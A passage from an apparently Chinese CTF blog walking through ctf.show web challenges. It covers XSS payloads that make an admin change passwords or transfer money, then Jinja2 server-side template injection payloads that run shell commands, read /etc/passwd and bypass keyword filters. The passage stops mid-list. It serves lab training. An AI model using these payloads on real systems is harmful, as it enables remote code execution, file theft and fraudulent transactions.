src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222500502.png" alt="image-20220405222500502"></p><p>易得post提交,我们试试3位的密码行不行</p><pre><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222645919.png" alt="image-20220405222645919"></p><p>骗人这不也行吗</p><h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405222804645.png" alt="image-20220405222804645"></p><p>我们看看admin有钱吗</p><pre><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;</code></pre><p>不让登</p><p>我们也可以让admin给我们转钱</p><p>先注册一个test收钱</p><pre><code>&lt;script&gt; $.ajax(&#123;url:&#39;http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;test&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405225612141.png" alt="image-20220405225612141"></p><p>有钱的</p><p>来转个负数试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223138599.png" alt="image-20220405223138599"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223206618.png" alt="image-20220405223206618"></p><p>这个人穷死了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223228380.png" alt="image-20220405223228380"></p><p>那我们在试试让别人买flag呢,其实是不行的这不就是花别人的钱给别人买东西吗.如果能把别人买的东西发回来说不定可以哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405223423586.png" alt="image-20220405223423586"></p><pre><code>&lt;script&gt;$.ajax(&#123;url:&#39;/api/getFlag.php&#39;,type:&#39;post&#39;&#125;);&lt;/script&gt;</code></pre><h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>我想的是我们创建账号就有五块,只要我们创建的账号足够多,就可以达到.不过有点麻烦</p><p>还有可以我们有五块钱,能不能给自己转钱会不会越转越多,我们试试,我们要转四块哦,转五块钱不够,就离谱,我不是有五块吗</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405224654748.png" alt="image-20220405224654748"></p><p>多点几下发现可以的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405224721929.png" alt="image-20220405224721929"></p><p>接着intruder自己玩一下就好</p><p>接着我们也可以让admin给我们转钱</p><p>先注册一个test收钱</p><pre><code>&lt;script&gt; $.ajax(&#123;url:&#39;http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;test&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405225406115.png" alt="image-20220405225406115"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/ctfshow/ctf.show/SSTI/"/>
      <url>/ctfshow/ctf.show/SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><h2 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h2><p><a href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi学习</a></p><p><a href="https://www.anquanke.com/post/id/188172">SSTI沙盒逃逸</a></p><p>网址输入“{undefined{7+7}}”页面显示14，说面存在“SSTI” ：</p><p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>常用方法</strong></p><pre><code>__class__           查看对象所在的类__mro__             查看继承关系和调用顺序，返回元组__base__            返回基类__bases__           返回基类元组__subclasses__()    返回子类列表__init__            调用初始化函数，可以用来跳到__globals____globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典__builtins__        返回内建内建名称空间字典__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）        都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_appget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_applipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;&#123;&#123;cycler.__init__.__globals__.os.popen('ls').read()&#125;&#125;current_app          应用上下文，一个全局变量request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()request.args.x1        get传参request.values.x1      所有参数request.cookies      cookies参数request.headers      请求头参数request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data           post传参    (Content-Type:a/b)request.json         post传json  (Content-Type: application/json)config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;</code></pre><p><strong>过滤器</strong></p><pre><code>int()        将值转换为int类型；float()        将值转换为float类型；lower()        将字符串转换为小写；upper()        将字符串转换为大写；title()        把值中的每个单词的首字母都转成大写；capitalize()    把变量值的首字母转成大写，其余字母转小写；trim()        截取字符串前面和后面的空白字符；wordcount()    计算一个长字符串中单词的个数；reverse()    字符串反转；replace(value,old,new)    替换将old替换为new的字符串；truncate(value,length=255,killwords=False)    截取length长度的字符串；striptags()    删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e    转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()        禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；list()        将变量列成列表；string()    将变量转换成字符串；join()        将一个序列中的参数值拼接成字符串。示例看上面payload；abs()        返回一个数值的绝对值；first()        返回一个序列的第一个元素；last()        返回一个序列的最后一个元素；format(value,arags,*kwargs)    格式化字符串。比如：&#123;&#123;"%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!length()    返回一个序列或者字典的长度；sum()        返回列表内数值的和；sort()        返回排序后的列表；default(value,default_value,boolean=false)    如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()    返回字符串的长度，别名是count</code></pre><p><strong>利用链</strong></p><p>python2、python3 通用 payload（因为每个环境使用的python库不同 所以类的排序有差异）</p><p>直接使用 popen（python2不行）</p><pre><code>os._wrap_close 类里有popen&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#39;whoami&#39;).read()</code></pre><p>使用 os 下的 popen</p><pre><code>含有 os 的基类都可以，如 linecache&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()</code></pre><p>使用<code>__import__</code>下的os（python2不行）</p><pre><code>可以使用 __import__ 的 os&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()</code></pre><p><code>__builtins__</code>下的多个函数</p><pre><code>__builtins__下有eval，__import__等的函数，可以利用此来执行命令&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><p>利用 python2 的 file 类读取文件</p><pre><code>在 python3 中 file 类被删除# 读文件[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).read()[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).readlines()# 写文件&quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)# python2的str类型不直接从属于属于基类，所以要两次 .__bases__</code></pre><p>flask内置函数</p><pre><code>Flask内置函数和内置对象可以通过&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;#查看内置函数#函数：lipsum、url_for、get_flashed_messages#类：cycler、joiner、namespace、config、request、session&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;#函数&#123;&#123;cycler.__init__.__globals__.os.popen('ls').read()&#125;&#125;#类如果要查config但是过滤了config直接用self.__dict__就能找到里面的config</code></pre><p>通用 getshell</p><pre><code>原理就是找到含有 __builtins__ 的类，然后利用&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#读写文件&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h2 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h2><pre><code>1.随便找一个内置类对象用__class__拿到他所对应的类2.用__bases__拿到基类（&lt;class &#39;object&#39;&gt;）3.用__subclasses__()拿到子类列表4.在子类列表中直接寻找可以利用的类getshell对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数</code></pre><h2 id="payload解释"><a href="#payload解释" class="headerlink" title="payload解释"></a>payload解释</h2><pre><code>关于python魔术方法payload：&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read() 的解释  # 获得一个字符串实例&gt;&gt;&gt; &quot;&quot;&#39;&#39;# 获得字符串的type实例&gt;&gt;&gt; &quot;&quot;.__class__ &lt;type &#39;str&#39;&gt;# 获得其父类&gt;&gt;&gt; &quot;&quot;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)# 获得父类中的object类&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2] &lt;type &#39;object&#39;&gt;# 获得object类的子类，但发现这个__subclasses__属性是个方法&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__&lt;built-in method __subclasses__ of type object at 0x10376d320&gt;# 使用__subclasses__()方法，获得object类的子类&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__() [&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]# 获得第40个子类的一个实例，即一个file实例&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40] mappingproxy&lt;type &#39;file&#39;&gt;# 对file初始化&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;) &lt;open file &#39;/etc/passwd&#39;, mode &#39;r&#39; at 0x10397a8a0&gt;# 使用file的read属性读取，但发现是个方法&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read&lt;built-in method read of file object at 0x10397a5d0&gt;# 使用read()方法读取&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read()nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/falseroot:*:0:0:System Administrator:/var/root:/bin/sh</code></pre><p>[关于python魔术方法payload：&quot;&quot;.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read() 的解释]: <a href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/">https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/</a></p><p>写一个python脚本带入执行查找flag</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;     &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         //遍历基类 找到eval函数    &#123;% if 'eval' in b.keys() %&#125;    //找到了      &#123;&#123; b['eval']('__import__("os").popen("ls").read()') &#125;&#125;  //导入cmd 执行popen里的命令 read读出数据    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  //然后cat 就可以&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("cat /tmp/ddddd/2222/flag ").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;//我们可以改里面的命令</code></pre><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>参数呢???</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281906623.png" alt="image-20220328190651574"></p><p>小小fuzz一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281917579.png" alt="image-20220328191752524"></p><p>找到个name参数,发现一个xss</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281919739.png" alt="image-20220328191917686"></p><p>不玩了,测试一下ssti</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281920069.png" alt="image-20220328192003008"></p><p>发现存在模板注入</p><pre><code>获得字符串的type实例?name=&#123;&#123;"".__class__&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281921506.png" alt="image-20220328192137444"></p><pre><code>获得其父类?name=&#123;&#123;"".__class__.__mro__&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281922424.png" alt="image-20220328192221359"></p><pre><code>获得父类中的object类?name=&#123;&#123;"".__class__.__mro__[1]&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281924934.png" alt="image-20220328192427878"></p><pre><code>获得object类的子类，但发现这个__subclasses__属性是个方法?name=&#123;&#123;"".__class__.__mro__[1].__subclasses__&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281925083.png" alt="image-20220328192545009"></p><pre><code>使用__subclasses__()方法，获得object类的子类?name=&#123;&#123;"".__class__.__mro__[1].__subclasses__()&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281926393.png" alt="image-20220328192626252"></p><pre><code>提供 os._wrap_close 中的 popen 函数?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;# 这种方法的缺点在于需要找到 类 的索引</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281930568.png" alt="image-20220328193058507"></p><p>来个脚本</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;     &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         //遍历基类 找到eval函数    &#123;% if 'eval' in b.keys() %&#125;    //找到了      &#123;&#123; b['eval']('__import__("os").popen("ls").read()') &#125;&#125;  //导入cmd 执行popen里的命令 read读出数据    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  //然后cat 就可以&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("cat /tmp/ddddd/2222/flag ").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;//我们可以改里面的命令</code></pre><p>用的时候可以把注释去掉</p><pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;     &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;             &#123;% if 'eval' in b.keys() %&#125;          &#123;&#123; b['eval']('__import__("os").popen("ls /").read()') &#125;&#125;     &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281936748.png" alt="image-20220328193657700"></p><pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;     &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;             &#123;% if 'eval' in b.keys() %&#125;          &#123;&#123; b['eval']('__import__("os").popen("cat /flag").read()') &#125;&#125;     &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281937923.png" alt="image-20220328193722883"></p><p>另外的方法</p><p>也可以直接用 <strong>lipsum</strong> 和 cycler 执行命令</p><pre><code>?name=&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;?name=&#123;&#123;cycler.__init__.__globals__.os.popen('ls').read()&#125;&#125;</code></pre><p>或者用控制块去直接执行命令</p><pre><code>?name=&#123;% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat ../flag').read()"))%&#125;</code></pre><h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><h2 id="ssti模板注入绕过"><a href="#ssti模板注入绕过" class="headerlink" title="ssti模板注入绕过"></a>ssti模板注入绕过</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li><code>&#123;%%&#125;</code>可以用来声明变量,当然也可以用于循环语句和条件语句</li><li><code>&#123;undefined&#123;&#125;&#125;</code>用于将表达式打印到模板输出</li><li>&#96;&#96;表示未包含在模板输出中的注释</li><li>##可以有和<code>&#123;%%&#125;</code>相同的效果</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>除了使用标准的python .(点)之外,还可以使用中括号来访问变量的属性.</p><pre><code>&#123;&#123;"".__class__&#125;&#125;&#123;&#123;""['__class__']&#125;&#125;</code></pre><p>所以过滤了. 我们还可以使用中括号绕过个.如果想调用字典中的键值,其实本质上是调用了魔术方法__getitem__ 所以对于取字典中键值的情况不仅可以使用[],也可以使用__getitm__,当然对于字典来说,我们也可以用他自带的一些方法了.pop就是其中的一个</p><pre><code>pop(key[,default])参数key: 要删除的键值default: 如果没有 key，返回 default 值删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</code></pre><p>那么调用对象的方法具体是什么原理呢,其实他调用了魔术方法_<em>getattribute</em>_</p><pre><code>&quot;&quot;.__class__&quot;&quot;.__getattribute__(&quot;__class__&quot;)</code></pre><p>如果题目过滤了class或者一些关键字,我们就可以通过字符串处理进行拼接了</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li><p>拼接</p><pre><code>&quot;cla&quot;+&quot;ss&quot;</code></pre></li><li><p>反转</p><pre><code>&quot;__ssalc__&quot;[::-1]</code></pre><p> 在jinjia2里面,”cla””ss”是等同于”class”的</p><pre><code>&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)&quot;&quot;[&quot;__ssalc__&quot;][::-1]&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre></li><li><p>ascii转换</p><pre><code>&quot;&#123;0:c&#125;&quot;.format(97)=&#39;a&#39;&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#39;__class__&#39;</code></pre></li><li><p>编码绕过</p><pre><code>&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;对于python2的话，还可以利用base64进行绕过&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre></li><li><p>利用chr函数</p><p> 我们没有办法直接使用chr函数,因此需要通过__builtins__找到它</p><pre><code>&#123;% set chr=url_for.__globals__['__builtins__'].chr %&#125;&#123;&#123;""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</code></pre></li><li><p>在jinja2里面可以利用~进行拼接</p><pre><code>&#123;%set a='__cla' %&#125;&#123;%set b='ss__'%&#125;&#123;&#123;""[a~b]&#125;&#125;</code></pre></li><li><p>大小写转换</p><pre><code>&quot;&quot;[&quot;__CLASS__&quot;.lower()]</code></pre></li></ol><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><ol><li><p>attr</p><p> attr用于获取变量</p><pre><code>&quot;&quot;|attr(&quot;__class__&quot;)相当于&quot;&quot;.__class__</code></pre><p> 这个大家应该见的比较多了，常见于点号(.)被过滤，或者点号(.)和中括号([])都被过滤的情况</p></li><li><p>format</p><pre><code>&#123; &quot;%s, %s!&quot;|format(greeting, name) &#125;&#125; </code></pre><p> 那么我们想要调用__class__就可以用format了</p><pre><code>&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#39;__class__&#39;&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]</code></pre></li><li><p>first last random</p><pre><code>Return the first item of a sequence.Return the last item of a sequence.Return a random item from the sequence.</code></pre><p> random的话是随机返回，这样我们跑个脚本肯定是可以得到我们想要的</p><pre><code>&quot;&quot;.__class__.__mro__|last()相当于&quot;&quot;.__class__.__mro__[-1]</code></pre></li><li><p>join</p><p> 多了一种字符串拼接的方法</p><pre><code>&quot;&quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] 或者 &quot;&quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]相当于&quot;&quot;[&quot;__class__&quot;]</code></pre></li><li><p>lower</p><pre><code>&quot;&quot;[&quot;__CLASS__&quot;|lower]</code></pre></li><li><p>replace reverse</p><p> 我们可以利用替换和反转还原回我们要用的字符串了</p><pre><code>&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</code></pre></li><li><p>string</p><p> 功能类似于python内置函数 str有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。</p><pre><code>().__class__   出来的是&lt;class &#39;tuple&#39;&gt;(().__class__|string)[0] 出来的是&lt;</code></pre></li><li><p>select unique</p><p> 